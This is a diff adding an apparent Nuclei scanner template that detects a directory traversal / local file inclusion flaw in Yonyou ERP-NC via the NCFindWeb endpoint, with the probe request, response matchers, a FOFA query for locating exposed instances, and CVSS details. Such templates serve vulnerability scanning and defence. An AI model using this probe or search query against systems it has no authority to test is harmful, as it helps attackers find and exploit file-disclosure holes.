@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - Client
+            - ncwslogin.jsp
+            - admin.jsp
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename='
+id: yonyou-nc-ncfindweb-directory-traversal
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: ERP-NC is vulnerable to local file inclusion.
+    metadata:
+        fofa-query: 用友-UFIDA-NC
+    name: yonyou nc - Local File Inclusion
+    reference:
+        - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+    severity: high
+    tags:
+        - erp-nc
+        - 用友-ufida
